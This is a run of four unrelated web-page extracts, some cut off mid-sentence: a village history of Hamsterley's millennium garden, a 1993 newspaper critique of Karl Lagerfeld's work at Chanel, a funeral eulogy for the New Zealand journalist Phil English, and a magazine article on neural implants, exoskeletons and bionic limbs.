felt to be beyond the reach of the local community.&#xa0; A local working party was duly drawn together to work on the development of the garden and to devise a suitable layout and planting plan.</p>    <p>The approximately regular shape of the garden and the central entrance lent themselves well to a balanced design, which it was felt would give the garden a clear structure.&#xa0; Among several possible designs kindly drawn up for us by a friendly landscape architect, the simplest was the one eventually chosen, as we were aware that we were dealing with quite a small area that could easily become cluttered.</p>    <p>Our little yew tree would have to be the most important feature, of course, though we knew that it would take many years to grow to any remotely impressive size.&#xa0; In fact it soon filled the elegant dome-shaped frame that Raymond Ayre, a local craftsman working in wrought iron, had made for it and this now acts instead as a Clematis support.&#xa0; He also designed and made the gates for the entry to the garden, in both cases incorporating the year 2000 in the design.</p>    <p>Meanwhile, Northumbrian Water kindly donated the magnificent, and extremely heavy, stones for the paved areas.&#xa0; The demanding task of laying them as level paving was carried out by Jonathan and Stephen Love, of Wolsingham, who very skilfully concealed the fact that some of the stones are as much as nine inches thick.</p>    <p>Steven Bainbridge was responsible for the remaining stonework in the Garden, including the plinth&#xa0;surrounding&#xa0;the slate information panel which tells the story of the garden.&#xa0; Eric Bainbridge carved the Millennium plaque in the wall to the right of the entrance.</p>    <p>With the garden structure in place, there was now the question of what to plant.&#xa0; Our starting point was that the word &#x2018;Yew&#x2019; (as well as its Latin name &#x2018;Taxus&#x2019;) began with a letter that was part of the word &#x2018;Hamsterley.&#x2019;&#xa0; Prompted by this thought and looking for a way to relate the garden to its location, we wondered whether there was any sense to be made from choosing other plants that also began with letters in the word &#x2018;Hamsterley.&#x2019;&#xa0; At first the idea was simply a tentative experiment, but in fact it fell into place with remarkable ease.&#xa0; Since those early days, of course, we have received a number of gifts of plants that are very welcome additions, whether or not they match our original plan.&#xa0; A more&#xa0;important principle in our choice was &#x2013; and still is &#x2013; that in every season there should be beauty, whether in terms of flowers, fruits or scent.</p>    <p>Local people have&#xa0;kindly donated the benches&#xa0;and&#xa0;some additional plants, and many generously give regularly of their time and effort in clearing, planting and maintaining the Garden.</p>    <p>Each year, the Sunday School children take responsibility for growing, planting and caring for some of the plants in the garden such as bulbs in pots, sweet peas and nasturtiums.&#xa0; And each December the Garden&#x2019;s importance as a focus for the village is emphasised by the presence of a decorated and lit Christmas tree, around which we all gather to sing Christmas carols.</p>    <div>     <p>Drawing by Linda Birch</p>    </div>    <p>To all who have contributed in any way, we say a very sincere thank you on behalf of all the residents of Hamsterley.</p>    <h2><b>Location</b>:</h2>    <p>The Garden is next-door to the Methodist Church in the village of Hamsterley, which stands on a ridge between Weardale and Teesdale some seven miles west of Bishop Auckland, and three miles west of the A68.</p>    <h3>&#xa9;

   <div>   <p><em>Kaiser Karl&#x2019;s cul-de-sac: For ten years, Karl Lagerfeld has ruled international fashion. He made Chanel the status label for the Eighties, then took on every other spare label in sight. But now, the spirit of Coco Chanel is back in fashion, and Karl seems to have lost the&#xa0;plot</em></p>   <p><strong>The Independent |&#xa0;Sunday, 29 August&#xa0;1993</strong></p>   <p><strong>by Marion Hume&#xa0;</strong></p>   <p>IN 1926, Jean Cocteau dashed off a simple sketch that summed up the state of fashion at a glance. In the foreground, a slender woman slouches comfortably in a simple jersey dress with only a squiggle of jewellery, while in the distance, a lumpen woman in a floor-length, fur-trimmed coat drags herself off the page and into history. &#x2018;Poiret s&#x2019;eloigne &#x2013; Chanel arrive,&#x2019; Cocteau scribbled on the bottom of the drawing: Poiret &#x2013; the favourite designer of the early Twenties &#x2013; leaves and Chanel&#xa0;arrives.</p>   <p>And so she did, and went on &#x2013; as we all know &#x2013; to change the way women dress forever. When she cut a man&#x2019;s pullover down the front, trimmed it with ribbon and shrugged it on because she was feeling chilly in Deauville, Coco Chanel was just making herself comfortable. But it was the beginning of a design revolution and the simple cardigan jackets with the high-cut armholes, those supple suits made from the men&#x2019;s underwear jersey, encouraged women around the world to ease up,&#xa0;too.</p>   <p>If Cocteau were drawing today, it would be Karl Lagerfeld who was leaving. The modern woman in the foreground would be wearing something by, say, Ann Demeulemeester, or Calvin Klein, Martin Margiela or Rei Kawakubo. The woman in the background, however, would be wearing a scarcely recognisable classic Chanel jacket over a white shirt slung about with gold belts, a black tie, wrinkled leggings, Chanel-insignia furry snow boots, chain-handled quilted bag, CC choker, padlock pendant . . . so many bits and pieces, the back view could only be a&#xa0;relief.</p>   <p>For we are not now in a Chanel moment, or at least in a Chanel-Lagerfeld moment. We have been, all the way through the Eighties, which in fashion terms concluded with the spring/summer 1992 collections. But now the Chanel suit, with its gob-stopper gold buttons and boxy little jacket, looks as incorrect as a fur coat, and Karl Lagerfeld, who has always hurtled forward, suddenly looks like he&#x2019;s stumbling down a&#xa0;cul-de-sac.</p>   <p>In the mid-Eighties, Lagerfeld&#x2019;s Chanel shows, which took the breezy cream and navy dressing of Coco&#x2019;s Deauville as their starting point, were delightful. By the late Eighties, they were sensational. Abbreviated suits in acidic colours, smothered in gold insignia, came marching down the catwalk to jarring vocals chanting &#x2018;I am a very very rich girl . . .&#x2019; The clothes were gutsy, they were exuberant and, whether one liked or loathed them, they were right for the&#xa0;times.</p>   <p>But the times moved and Karl shot off on his tangent. In March this year, after the autumn/winter ready-to-wear shows for Chanel, Chloe, Fendi and Lagerfeld (all designed by Karl, and mostly monstrous) Women&#x2019;s Wear Daily, the powerful fashion trade paper, wrote &#x2018;The Lagerfeld juggernaut has stalled.&#x2019; At last month&#x2019;s Chanel haute couture show, it showed no further sign of&#xa0;revival.</p>   <p>Out came micro-skirts over wobbling buttocks; waspish corsets that pushed breasts inwards and upwards so they jiggled like jellies on a plate, and gilded tweed bras (hands up who needs one). The show had begun with mock-iron gates thrust open at the head of the catwalk. At the end the gates were banged shut and padlocked. Then came an announcement: &#x2018;You cannot go backstage. Mr Lagerfeld will be available shortly to receive your congratulations in the courtyard outside.&#x2019; Apart from some Japanese film crews, always keen for a quote, there wasn&#x2019;t much of a&#xa0;queue.</p>   <p>All the signs are that Lagerfeld, who is said to spend a lot of time watching MTV in any one of the splendid 18th-century residences&#xa0;he has acquired, has lost the plot. Looking at MTV, you can understand why. Black rappers, with their oversized clothes, heavy gold chains, belts and optional guns, seem to have become muddled in his creative mind with the old Chanel classics. In the past, &#x2018;the street&#x2019; has given Lagerfeld just a touch of inspiration; this time it seems to have overwhelmed him as he has attempted to translate young black style into fashion for the bourgeois white customer. The gap between rich and poor has grown larger, and the symbol of Lagerfeld&#x2019;s Chanel &#x2013; all those crossed CCs that came to stand for conspicuous consumption &#x2013; have been replaced by PCs. Politically Correct Lagerfeld is&#xa0;not.</p>   <p>&#x2018;One might just as well tie a cheque around one&#x2019;s neck&#x2019; Coco Chanel once said of women who wore huge diamond solitaires. She might have said the same about Lagerfeld&#x2019;s&#xa0;suits.</p>   <p>The irony is that, as Lagerfeld&#x2019;s influence wanes, it is the spirit of Coco Chanel which has arrived in fashion once more. Very much her own woman, Chanel had more on her daily agenda than keeping tricksy clothes in place. She cut her own fringe, pulled on a Breton fisherman&#x2019;s jacket, wide pants and a T-shirt, tied a ribbon round her hair, slung on a string of pearls, stuffed her hands in her pockets and got on with her day. And that style, which mixed the readily available with the extraordinary, is in tune with the current &#x2018;magpie&#x2019; school of dressing. After the fall of the short skirt and the loosening up of cut and shape, women are wearing comfortable clothes that make them feel feminine, modern, and in control of their sexuality. They are more confident about putting together their own style piecemeal, less concerned with&#xa0;status.</p>   <p>ONE SHOULDN&#x2019;T forget, however, Lagerfeld&#x2019;s enormous contribution to fashion &#x2013; the greatest of which was that he took over the house of Chanel and shook it up. For almost 10 years he was probably the most&#xa0;influential</p>   <p>designer in the world. And while he can no longer be considered centre-stage, there is no sign that the Wertheimer family, which owns&#xa0;the Chanel name and employs Lagerfeld&#xa0;under contract, are still anything less than&#xa0;happy with&#xa0;him.</p>   <p>When he took over at Chanel in 1983, Lagerfeld told the fashion journalist Suzy Menkes, then of the Times: &#x2018;I am a kind of fashion computer.&#x2019; Ten years later, who could doubt the truth of it? By then, 54 years old, he was designing two collections for Fendi, two for Chanel haute couture, two for Chanel pret- a-porter, two Chanel cruisewear collections for America, two collections for Chloe, two for the Karl Lagerfeld label, two for Karl Lagerfeld Cruise as well as overseeing the mass-market label, KL, and photographing advertising campaigns for Chanel and Karl Lagerfeld as well as other clients including Mercedes Benz. Is it hardly surprising that, finally, he seems to have overreached&#xa0;himself.</p>   <p>But if Lagerfeld&#x2019;s power is slipping, Chanel, under the Wertheimers, is simply shifting its emphasis. Even if the basic suit been exploited almost to death, there is always that other treasure trove to plunder, the inspirational Chanel jewellery. This was the way Coco Chanel gave even the simplest suit a dash of individuality and&#xa0;splendour.</p>   <p>A new book by Patrick Mauries, published next month, focuses on Coco&#x2019;s jewellery creations and ignores Karl Lagerfeld. In researching the well-worn ground (there have been hundreds of books about Chanel) Mauries has pulled out some of the lesser-known photographs, as well as charming illustrations by Eric for Vogue, by Marcel Vertes for&#xa0;Harper&#x2019;s</p>   <p>Bazaar, by Christian Berard and Paul Iribe, and, most interestingly, he has included a previously unpublished portfolio of drawings by the prolific Jean Cocteau, recently discovered in an envelope marked&#xa0;&#x2018;Chanel&#x2019;.</p>   <p>Mauries&#x2019; scholarly book, unintentionally perhaps, reflects a shift in taste. Coco aficiandos &#x2013; those who have hated Lagerfeld&#x2019;s pillaging of her archive and have thus been at odds with fashion for almost a decade &#x2013; are reclaiming their territory. The emphasis is now on taste, pared-down dressing, quality, authenticity. And with simplicity to the fore, it is jewellery instead of accessories &#x2013; favourite pieces, whether precious or fake &#x2013; which move across a variety of clothes and give&#xa0;the modern woman a touch of ornament and individual&#xa0;style.</p>   <p>For years, fake was fashionable.

   <div>   <p>Simon Moore is a highly respected Crown Prosecutor and long-time friend of the late Phil English.</p>   <p>The following is the&#xa0; eulogy he presented at the funeral service for Phil.&#xa0; Thanks to Simon and Michele Hewitson of the <em>NZ Herald</em> for sending it to me.</p>   <p><strong>Eulogy for Philip Russell English</strong></p>   <p><strong>1953 to 2011</strong></p>   <p>On the 3rd of February 1959 a tiny figure, clothed in maroon, shuffled self-consciously through the imposing brick gates of Kings School. At that time neither of his accompanying&#xa0;parents, Russell and Mary English, could possibly have guessed that while this event signalled their youngest son&#x2019;s formal introduction to education, their apparently unremarkable, but deeply loved, 5 year old, would in his own and utterly unique way educate&#xa0;so many of those whose lives rubbed up against his own in the 52 years which would follow. He would influence so many in those core qualities of humour and human kindness. For if there is anything which summarises Philip English it is that he was the kindest and the funniest of men.</p>   <p>Philip Russell English&#x2019;s passage through the 13 years of school which followed that event in 1959 was characterised by intense and prolonged periods of inconspicuous normality. He turned being&#xa0;inconspicuous into an art form. For him, sport and recreation held none of the allure which more prominent school boys thrived on. I am certain that if he had aspired to succeed he would have. But he found the whole sporty&#xa0;thing puzzlingly pointless. It was hard to argue against him.</p>   <p>Those 8 years at Kings Prep were sublimely happy ones. Wonderful life long friendships were forged and it is heartening, but not at all surprising, to see old friends from our Year 1 class here this afternoon and to receive messages&#xa0;of love and support&#xa0;from others like Chris and Marlene Palmer in Paris. Phil&#x2019;s nickname from those days was Pinkie. Not even Phil could remember quite why. But it stuck right through to university.</p>   <p>I well remember one afternoon standing outside the school gates on Remuera Rd with Phil and Ken Whitney. We&#xa0;were about to finish our last year and were discussing how much fun we had had. Surely life could not continue to be&#xa0;this much fun.</p>   <p>How right we were. It wasn&#x2019;t. We went to boarding school.</p>   <p>Phil&#x2019;s five years at the College were&#xa0;as unremarkable as his primary years. He perfected the elusive art of cultural camouflage; never drawing unnecessary attention to himself; although he did join the choir at his mother&#x2019;s insistence. Which meant that I followed. He and I chortled tunelessly from the front row of the stalls for nearly two terms before Phil was&#xa0;fired at the start of Term 3. I followed&#xa0;a fortnight later.</p>   <p>However, there are three qualities which emerged in those school years which, I am certain, were formative in terms of his later life.</p>   <p>The first was the development&#xa0;of Phil&#x2019;s fascination&#xa0;in the natural world. At primary school&#xa0;he had devoured every David Attenborough book &#xa0;ever published. After his dismal choir experiences he&#xa0;joined the Bird Club under the inspirational leadership of teacher Dick Sibson, an ornithologist of national standing. Almost certainly this experience was formative in Phil&#x2019;s&#xa0;insightful understanding of the environment whether it was Godwits at Miranda or possum control in the Waitakeres. It was this interest which decades later&#xa0;made so obvious his appointment as&#xa0;the Herald&#x2019;s environmental correspondent. He was easily&#xa0;the best they ever had because he loved the subject and truly understood the core issues around bio-diversity and sustainability long before it became fashionable.</p>   <p>The second was his natural creativity. He was a talented artist although his&#xa0;profound colour blindness&#xa0;resulted in some unusual effects especially&#xa0;after he&#xa0;made the error of trusting me to tell him which colours were which. He was also an accomplished writer.&#xa0;He loved and excelled in the subject. His career choice, even if he did not know it at the time, would prove to be a perfect forum within which to indulge those skills.</p>   <p>The third was his approach to others. He was not the sports jock. But he was popular; very popular. And that popularity flowed from his unadorned and plainly evident lack of any form of malice or self-importance. He treated everyone the same. He never had a bad word to say about anyone. He just got on with his life. Having said that, he was ruthlessly intolerant of unfairness. Where he saw unfairness he did all he could to right it. In that sense he&#xa0;displayed the same sort of moral courage which in later years we all so admired.</p>   <p>In 1972, along with just about everyone in our year it seemed, we headed to Dunedin to do Med Intermediate. Phil and I enrolled at Selwyn College. It was an utterly mad year of excess in every conceivable way. With the shackles of school conformity removed and with&#xa0;Selwyn&#x2019;s healthy&#xa0;tolerance of eccentricity,&#xa0;we were all allowed to became 9 year olds again. And so we played like 9 year olds&#x2026;.for nearly a year. It was over this time that Phil&#x2019;s wonderfully creative sense of the ridiculous began to emerge properly.</p>   <p>His musical tastes were unconventional (at least for a 19 year old in 1972). The cool music at that time consisted mainly of Leonard Cohen&#x2019;s&#xa0;dreadfully depressing dirges and Joe Cocker&#x2019;s tuneless shouting. But not so for Phil. He found Dean Martin. His favourite song was &#x201c;Little Old Wine Drinker Me&#x201d;.</p>   <p>In the interests of actually finishing this eulogy I&#xa0;shall restrict this colourful phase of Phil&#x2019;s life to&#xa0;just two stories. Each is&#xa0;quintessentially Phil.&#xa0;Each demonstrates that even before he hit 20, the unique elements&#xa0;of his personality which we all so loved&#xa0;in this man were already present&#xa0;.</p>   <p>The first was his obsession with Napoleon Bonaparte. I am uncertain how it all&#xa0;started, but Phil began to grow his side-boards and a smudge of wispy&#xa0;whiskers above his top lip. His hair (much to his alarm) was already&#xa0;starting to recede. He did, indeed, share more than just a passing resemblance to the great Emperor. To this ensemble, as&#xa0;his meagre student allowance&#xa0;permitted, he secured&#xa0;a white waistcoat, tight white pants and a blue jacket. He then added a colourful sash and an&#xa0;impressive broach made from milk bottle tops. There is a wonderful photo of Phil&#xa0;in the College magazine of that year, in&#xa0;classic Napoleonic&#xa0;pose with his right hand inside his waistcoat. He even has a glass of brandy in the other hand. This phase only ended when Phil was denied entry to the college ball on the grounds that he did not meet the dress code. He was last heard berating the bouncers for their cultural insensitivity in not recognising the formal attire of a highly ranked Frenchman.&#xa0;&#xa0;</p>   <p>The other occurred at the end of the academic year. In fact it was the final of the physics exam. Like most of us&#xa0;doing Med Intermediate, Phil found physics incomprehensible. The physics final was the last exam before we broke up for summer. We were all crammed into a hall with the usual cast of elderly ex-teacher types who are annually dragged out&#xa0;to make sure we didn&#x2019;t cheat. Phil was seated towards the front. At 9.30 the bell rang to start the exam. Like a well drilled orchestra, the sound of pages turning filled the room as we scanned the exam paper to see how many of the questions were capable of&#xa0;an answer. Phil was the first to protest publicly. Shaking his head, he slowly stood up and began to make his way to the exit. He had not got far before the chief supervisor barked out that no one was permitted to leave the exam room before one hour. Phil slowly and clearly reluctantly made his way back to his seat.</p>   <p>The last question was the only one Phil felt he could make a decent stab at. It read,</p>   <p>&#xa0;<em>&#x201c;Imagine you have a younger brother aged 11. Explain, using appropriate analogies, how Einstein&#x2019;s Theory of Relativity works&#x201d;</em></p>   <p>Phil settled himself down and began to write.</p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#x201c;Well Bob (Bob is the name of my 11 year old brother), the theory of relativity is very complicated. It took many millions of years</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;of&#xa0;human evolution to produce a man brainy enough to work it out. His name was Einstein. He had a big white bushy moustache</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;and hairy eyebrows. I know that some people say that the theory has something to do with trains passing in a railway station. </em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; I don&#x2019;t understand it and if I don&#x2019;t I can&#x2019;t see how you will&#x201d;.</em></p>   <p>Composing this answer occupied no more than 10 minutes and Phil still had at least 40 minutes to kill before he could escape. And because he was due to head home to Auckland the next day he decided that the most productive course would be to compile his shopping list on the paper the university had so generously supplied in the form of his exam book. This took him to 10.35. Shopping list complete, Phil got up from his seat for the second time that morning. He handed over his&#xa0;exam book&#xa0;and left.</p>   <p>A few minutes later we were all startled by a noisy ruckus at the door. It involved a heated exchange between Phil and the chief supervisor which went something like this;</p>   <p>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; <em>&#x201c;You cannot have it back. You surrendered&#xa0;your exam book&#xa0;when you left the room. I don&#x2019;t care that you have left your shopping </em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;list in it. You cannot have it back. Now please leave before I call the Proctor&#x201d;.</em></p>   <p>Not unsurprisingly, Phil&#x2019;s academic results were not quite enough to get him into Med School. But, as with everywhere he has gone in life, he made wonderful friends that year. A number are with us today. Thank you for coming.</p>   <p>It was time for a change. So Phil headed for the Kingdom of Tonga. He took up a teaching position at St Andrews School. His letters &#xa0;and tape recordings from that time are wonderfully descriptive and terribly funny. As he had done elsewhere, he&#xa0;again created around himself a cadre of close friends; fellow teachers and AFS workers from around the world. He loved Tonga. He revelled in the absurdity and contradictions&#xa0;of so much of what he saw particularly the antics of the Royal family in the midst of such poverty. Phil detested unfairness and pomposity. But&#xa0;he recognised&#xa0;the futility of trying to confront these things head on, so&#xa0;he played with them. He made quiet fun of the silliness of it all. We had wonderful descriptions of the monocled Crown Prince squeezed into his London Taxi or the vastness of the&#xa0;King lost in the back of his even&#xa0;vaster Mercedes stretch limo.</p>   <p>Tonga influenced Phil in at least three ways.</p>   <p>First, he gained his second nickname. He&#xa0;became known as &#x201c;Lampshade Phil&#x201d;.</p>   <p>Secondly, and almost certainly connected to the first, he was elected to the Presidency of the Royal Nuku&#x2019;alofa Martini Club. Martinis became Phil&#x2019;s signature cocktail and were the catalyst for some outrageously wild parties in Tonga and later back here. The mix was proscriptive. There could be no variation from the obligatory 9 gin&#xa0;to 1 Vermouth. It was mind numbing stuff.</p>   <p>Thirdly, Phil&#x2019;s musical tastes matured from Dean Martin.&#xa0;He fell in love with the discordant tones of the Fiji Police Brass Band. He bought up every recording he could get his hands on and no Martini party was complete without several tapes of the band being played. It was excruciatingly funny as the band mutilated its way through various brass tunes; some recognisable; most not.</p>   <p>On his return to New Zealand, and no doubt under pressure from Russell and Mary to get a qualification, Phil enrolled&#xa0;in the AIT&#x2019;s&#xa0;journalism course. Initially I don&#x2019;t think he was awfully keen on the idea. But in hindsight it was an inspired step because journalism indulged so many of Phil&#x2019;s core qualities. He was an excellent writer; articulate, concise and always with an eye out&#xa0;for the absurd.&#xa0;He understood the&#xa0;central importance of the fourth estate&#x2019;s role as social commentator and public scrutiniser. And he lived&#xa0;true&#xa0;to that code to the day he retired.</p>   <p>His first job was as the Coromandel correspondent at the Thames Star. It was&#xa0;there that he won the New Zealand Community Newspaper Young Reporter of the Year. It was 1977. Flushed with that success he joined the Waikato Times where he was based in Te Aroha.</p>   <p>Then, in 1979 he headed to the UK.&#xa0;He lived in&#xa0;Winchester where he worked as a reporter for the Hampshire Chronicle. In Winchester the Martini parties flourished. More life long friendships were forged. Phil established the International Martini Club and was promptly elected its President for Life. He did&#xa0;nearly three&#xa0;years with the Hampshire Chronicle before returning to New Zealand to be a groomsman at our wedding. When our first child was born there was never any question as to who would be his Godfather.</p>   <p>But we were not alone in that choice. Phil was Godfather to many others because his wide and eclectic range of friends saw in him a rare and golden sincerity. What he may have lacked in religious and moral instruction he more than made up with his deep reserves of human generosity and kindness. He was deeply loved by all the kids who revelled in his eccentricity. His presents at birthdays and at Christmas were always wonderfully&#xa0;innovative and always the best. He must have spent hours perfecting his choices.</p>   <p>With the exception of the last three years, when his health prevented him, Phil&#xa0;has been a part of every family summer holiday since Jane and I got married. His succession of cocktails was outstanding and his exotic entrees brilliant so long as there was not too great a lag between drinks and dinner. The contents of the&#xa0;boot of his beloved 1967&#xa0;Wolseley 6/110 were always the same.&#xa0;There he kept&#xa0;his tent, groundsheet, lamp, transistor radio, inflatable mattress and his cast iron camp oven. Every summer he would drive down to the lake, unpack&#xa0;the boot&#xa0;and set up his camp. At the end of the holiday he would pack it all up again. It would stay in the boot for the next 11 months until liberated the following summer.</p>   <p>He was a fine journalist. In fact he was a good deal better than that. He was bitterly disappointed when he was taken off the environmental portfolio and put onto the&#xa0;local body run. But his journalist instincts never slackened and in this very important role he was deadly. At Phil&#x2019;s farewell &#x201c;roast&#x201d; from the Herald in 2005, it was Mike Lee, the then Chairman of the ARC, who said about Phil;</p>   <p><em>&#xa0;&#x201c;Philip English was feared and at times perhaps&#xa0;loathed by some ARC members who objected to public scrutiny. After he was transferred to court reporting duties it turned out to be a huge setback for the Regional Council&#xa0;and the public as&#xa0;the restraining influence of&#xa0;Phil&#x2019;s watchful presence, his</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; &#xa0;close&#xa0;knowledge of the ARC and his fearless reporting of</em></p>   <p><em>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0; &#xa0;events was never adequately filled again by&#xa0;a single&#xa0;journalist.&#x201d;</em></p>   <p>Long time friend and professional collegue, Michele Hewitson, put it perfectly when she described Phil as &#x201c;&#x2026;a very, very good journalist and any politician fooled by his Rumpole of the Bailey shuffle <em><span>was</span> </em>a fool.</p>   <p>It is heartening to see friends from his days at the Herald here.</p>   <p>Phil&#x2019;s uncanny&#xa0;knack of&#xa0;detecting and reporting on the ridiculous probably contributed to his being moved to court reporting. It had certainly made him unpopular in some quarters including the then Mayor, Colin Kay. On one occasion, after a particularly important speech, the Mayor&#x2019;s gravitas was&#xa0;seriously eroded after Phil reported that throughout the address the Mayor&#x2019;s right trouser leg was hitched above his ankle by a forgotten bicycle clip.</p>   <p>On another occasion, Phil reported the Mayor repeatedly referring to a prominent council member as &#x201c;Mr Hewi Toheroa&#x201d;.</p>   <p>As a court reporter, Phil was just as adept. He quickly gained the respect and trust of the High Court bench. He and I spent many happy hours together in court. It was a privilege and wonderful fun to work with him professionally.</p>   <p>One&#xa0;highlight was when he covered the trial of two Kings Old Boys. It was a distinguished cast of actors.&#xa0;The judge, both prosecutors and the reporter were part of this impromptu school reunion. Only the defence counsel,&#xa0;Peter Williams QC , was on the outer.</p>   <p>I must also make mention of Phil&#x2019;s many years of contribution as a Council member of the Deafness Research Foundation. He was an invaluable conduit for getting media coverage of significant research developments and lead the work on a number of public relations initiatives for the Foundation.&#xa0;It is gratifying to see so many&#xa0;from the DRF here.</p>   <p>Phil was never one to be hurried. He moved through life at his own pace. He was never flustered. Everything he did, he did with impressive deliberation. It was a quality which influenced every aspect of his life. He was also a man of habit and every Friday night he would walk up to the local Indian takeaway, Bombay Junction, owned and run by the colourful and cheerful&#xa0;Prince. According to Prince, Phil would stand at the counter pensively scratching his chin peering up at the menu board. He would mutter and mumble as he wrestled with the bewildering array of mouth-watering options which confronted him. The decision making could take up to ten minutes. Finally Phil would make his decision. This was Prince&#x2019;s cue to disappear out to the back of the shop and return with a freshly cooked Lamb Tika. Phil would look puzzled. &#x201c;That was fast. How did you do that?&#x201d; he once asked. &#x201c;Easy&#x201d; said Prince. &#x201c;You always order Lamb Tika&#x201d;.</p>   <p>Three years ago Phil was diagnosed with a progressive neurological condition with an unpronounceable name.&#xa0;His life was turned upside down. He had to move from his Parnell flat. He had to sell his beloved Wolseley. And patiently, without ever a word of complaint, a hint at self-pity&#xa0;or the slightest&#xa0;fuss, he simply wore out. It was excruciating to witness. The brunt of this horror was born by David and Caroline and I cannot record more strenuously our collective indebtedness to you both for all you did to look after Phil in his final years, particularly the last few months. 2011 has been a hell of a year for you. Only three months ago you, Robert&#xa0;and Phil lost your father Russell. Now its Phil.</p>   <p>You, together with Lucy and Sarah,&#xa0;were terribly important to Phil throughout his life. He adored you all. Robert, I also acknowledge your support and love as&#xa0;Phil&#x2019;s Sydney-based brother.&#xa0;</p>   <p>So now it is our time to bid our farewell to this extraordinary man; a man who touched so many lives in so many positive ways.</p>   <p>A man who was utterly non-judgemental, whose warmth and generosity of spirit&#xa0;should be an inspiration to us all.&#xa0;&#xa0;</p>   <p>Through his efforts he leaves the world a much richer place than it was 57 years ago when he joined it.&#xa0;</p>   <p>In every sense he was the kindest and funniest of men.</p>   <p>&#xa0;Goodbye Phil.</p>   <p>Simon Moore</p>   <p>Friday 15 July 2011</p>  </div>

Not only will people possess superhuman intelligence and total recall, it could lead to the cancellation of TV quiz show Eggheads.</p>    <p>Already available are brain-computer interfaces (BCI) that link your mind to a PC for communication or to control devices such as wheelchairs. The technology was recently used by a group of disabled music fans who created the world&#x2019;s first dance track using their minds.</p>    <p>More intrusive are neural implants inserted inside your grey matter. Medical uses include treating diseases that affect motor function or providing an alternative to psychiatric drugs but these implants could also result in increased brain power and mind control.</p>    <p>Implants would also allow wireless connection to devices such as smartphones and games consoles. Professor Nikolas Rose of King&#x2019;s College London is the author of Neuro: The New Brain Sciences And The Management Of The Mind. He says: &#x2018;These implants involve the implantation of electrodes deep into different areas of the brain and the application of small electrical currents.</p>    <p>&#x2018;However, it&#x2019;s rather unproven and not at all clear how it works. The operation requires drilling a hole in the skull and a very precise location of electrodes, so it&#x2019;s not been carried out on the patient numbers required for full clinical trials. There is also a strong social, ethical and safety argument regarding their use.&#x2019;</p>    <p>However, the Kurzeil prophecy we&#x2019;re most excited about is nanobots in the bloodstream curing all diseases by 2030 and that we &#x2018;will be able to live without ageing&#x2019;.&#xa0;This nanotechnlogy has already been used successfully on mice. Animal testing is a charged subject but its proponents argue it is key to the rapid development of the genetic engineering that could turn us all into superhumans.</p>    <p>While &#x2018;playing God&#x2019; remains hugely controversial, many scientists are convinced it can be used to eradicate genetic diseases. Some say it could also create a boom in &#x2018;designer babies&#x2019;, where parents choose the sex, looks or even race of their child.</p>    <p>Leaving your insides well alone, how about becoming <b>Iron</b> Man with a powered exoskeleton? Besides the prospect of creating super-soldiers, these suits of tech armour could restore mobility to the disabled or simply help us go harder and faster for longer.</p>    <p>The &#xa3;90,000 Ekso is a 23kg titanium suit found in US hospitals that helps paralysed patients walk again. For half the price, Parker Hannifin&#x2019;s Indego and Argo Medical&#x2019;s ReWalk offer similar help for those with spinal injuries.</p>    <p>Defence giant Lockheed Martin has used the technology in its Human Universal Load Carrier (HULC), which is on the brink of being deployed for military use. It will allow a soldier to carry a 90kg load at 10mph over great distances.&#xa0;Paul Saffo, managing director of foresight at research firm Discern Analytics, recently told Bloomberg: &#x2018;The medical devices get the most attention, the military funds it and the first mass application is industrial.&#x2019;</p>    <p>Japanese company Cyberdyne has also engineered an exoskeleton which it has named HAL (Hybrid Assistive Limb), namesake of the killer computer from 2001: A Space Odyssey.&#xa0;The suit has been developed to help people in disaster zones move heavy equipment. Japanese hospitals are renting the suits for &#xa3;1,300 a month and a full-production model goes on sale soon.</p>    <p>And don&#x2019;t forget The Terminator. The robotic arm you thought John Connor destroyed is essentially the blueprint for replacement limbs with form and function.&#xa0;Suddenly The Six Billion Dollar Man and The Bionic Woman become a reality, with limbs responding to muscle movements or in conjunction with a brain-computer interface. (Future designs will even replicate the feel of what you&#x2019;re touching.)</p>    <figure>     <figcaption>      Nigel Auckland&#x2019;s prosthetic limb, the bebionic3 hand, has transformed his life. (Picture: SWNS)     </figcaption>    </figure>    <p>Nigel Ackland, from Royston, Cambridgeshire, lost his arm seven years ago but he has become a YouTube sensation since being fitted with a carbon-fibre forearm and hand.</p>    <p>The Bebionic3 Myoelectric limb detects muscle contractions and triggers one of 14 grips, allowing him to carry out tasks such as tying his shoelaces. <span>Ackland admits there were a few teething problems: &#x2018;I was walking the dog and he took off chasing something, ripping the lead out of&#xa0;</span><span>my hand &#x2013; but unfortunately the fingers came off too.&#xa0;</span>So they added stainless steel into the links to make sure they were stronger and could withstand that kind of force.&#x2019;</p>    <p>Ackland adds: &#x2018;When you first lose a limb, your confidence can take a massive blow. People in the street don&#x2019;t really know how to react to the fact that you have no arm and, as a result, you can be left feeling exceptionally withdrawn. With the Terminator arm, people come up and ask you about it.&#x2019;</p>    